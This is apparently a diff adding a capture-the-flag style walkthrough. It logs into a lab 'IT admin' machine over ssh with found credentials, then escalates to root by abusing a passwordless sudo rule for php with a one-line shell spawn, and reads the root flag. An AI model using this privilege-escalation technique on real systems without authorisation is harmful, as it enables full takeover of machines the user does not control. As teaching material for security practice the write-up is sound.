@@ -195,4 +195,74 @@ mauricemoss:pookie
 
 We can now go ahead to connecting to the IT Admin computer now that we know the ssh details. However before we get to that, <b><i>What is ssh?</i></b>
 
+Secure shell, also knows as ssh can be thought as a messaging service between a user and their computer. Sort of like the remote desktop protocol but for only the command line.
 
+Let's connect to the it admin computer with the credentials we have just found
+```bash
+ssh mauricemoss@mauricemosscomputer
+password: pookie
+```
+
+We'll be greeted with the ubuntu stock welcome page and we now have access to the administrator's computer.
+But what if we can get administrator on the administrator computer...?
+Why not let's do it.
+
+In cybersecurity, breaking into the administrator or <i>root</i> account is called privilage escelation. Our objective is to privilage escelate on this it admin computer so we have complete access to the entire network infrustucture.
+A common way to privilage escelate is to check what commands can be ran as sudo. Let's find out
+```bash
+sudo -l
+
+Matching Defaults entries for mauricemoss on itadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mauricemoss may run the following commands on itadmin:
+    (ALL) NOPASSWD: /usr/bin/php
+```
+
+See the line that says (ALL) NOPASSWD, this means that the mauricemoss can run phpas sudo on this computer. Let's spawn a shell
+```bash
+sudo php -r "system('/bin/bash');"
+```
+What does this command do?
+    -r: run, run php code from standard in (stdin)
+    - system(): tell php to run the system function to execute system commands
+    - /bin/bash: The command to execute, in this case, the bash command in location /bin/
+Therefore, this command will execute /bin/bash which will spawn a new shell. However, since we are running this command as sudo, the root user will be executing this instead of us, meaning that our shell will privilage escelate.
+
+```
+root@mauricemosscomputer$
+```
+We now have root. We can tell by executing the
+```
+whoami
+```
+command which will return our user.
+
+Now that we have root, we now have complete access to the company infrustucture. Let's prove that we've pwned this system by looking for the root flag. 
+Pretty much the only directory on any linux system that is restricted for regular users, is the /root directory so lets look in there.
+```bash
+cd /root
+ls
+
+secure.tar.gz
+```
+
+It does look like there's a tar archive here named secure... How suspicious.
+Let's "unzip this"
+```bash
+tar -xf secure.tar.gz
+ls
+```
+
+Look! Another directory, let's go in there
+```
+cd root
+ls
+```
+
+There's the flag, print it
+```bash
+cat flag.txt
+```
+
+Magic!
